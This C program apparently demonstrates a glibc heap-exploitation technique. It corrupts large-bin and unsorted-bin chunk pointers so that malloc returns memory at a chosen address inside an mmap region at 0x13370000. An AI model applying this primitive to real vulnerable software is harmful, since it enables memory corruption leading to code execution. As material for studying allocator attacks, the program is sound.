#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

int main()
{
	void *p0,*p1,*p2,*p3,*p4,*p5;
	void *p6,*p7,*p8,*p9,*p10,*p11;
	void *mm;
	long long *ptr,*mm_ptr;

	setbufs();
	mallopt(1,0);		//forbid fastbin

	p0=malloc(0x410);
	malloc(0x20);
	p1=malloc(0x420);
	malloc(0x20);

	free(p0);
	malloc(0x430);
	free(p1);
	// now we have a largebin and a unsortedbin
	// mmap a memory
	
	mm=mmap((void *)0x13370000, 0x1000, 3, 34, -1, 0);
	long long base=(long long)mm+0x800-0x20;

	ptr=(long long*)p1;
	*ptr=0;
	*(ptr+1)=base;

	ptr=(long long*)p0;
	*ptr=0;
	*(ptr+1)=base+8;
	*(ptr+2)=0;
	*(ptr+3)=base-0x18-5;

	printf("chunk_base:%p\n",p0);
	puts("watch");
	printf("if success, the new chunk address will be:%p\n",malloc(0x48));


	return 0;
}
	
